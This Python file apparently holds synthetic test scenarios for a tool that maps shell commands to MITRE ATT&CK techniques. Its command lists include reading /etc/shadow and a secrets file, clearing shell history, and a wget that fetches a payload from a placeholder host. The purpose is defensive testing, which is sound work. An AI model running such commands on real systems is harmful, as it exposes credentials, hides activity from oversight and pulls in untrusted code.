"""Predefined synthetic scenarios. Commands are NEVER executed."""
SCENARIOS = {
"discovery": {
"scenario_id": "discovery",
"name": "Host and Environment Discovery",
"description": "Tests recognition of basic host, user, network, and file discovery.",
"tactic": "Discovery",
"commands": [
"whoami",
"uname -a",
"ip addr show",
"ls -la",
],
"expected_techniques": ["T1033", "T1082", "T1016", "T1083"],
},
"credential_access": {
"scenario_id": "credential_access",
"name": "Credential File Access",
"description": "Tests recognition of commands targeting account and credential files.",
"tactic": "Credential Access",
"commands": [
"cat /etc/passwd",
"cat /etc/shadow",
"cat /opt/company/secrets.env",
],
"expected_techniques": ["T1087.001", "T1003.008", "T1552.001"],
},
"defense_evasion": {
"scenario_id": "defense_evasion",
"name": "Defense Evasion",
"description": "Tests recognition of permission changes and command-history clearing.",
"tactic": "Defense Evasion",
"commands": [
"chmod 755 /tmp/demo.sh",
"history -c",
],
"expected_techniques": ["T1222.001", "T1070.003"],
},
"file_transfer": {
"scenario_id": "file_transfer",
"name": "Simulated File Transfer",
"description": "Tests recognition of an ingress-transfer command pattern without network access.",
"tactic": "Command and Control",
"commands": [
"wget http://example.invalid/simulated-payload",
],
"expected_techniques": ["T1105"],
},
}
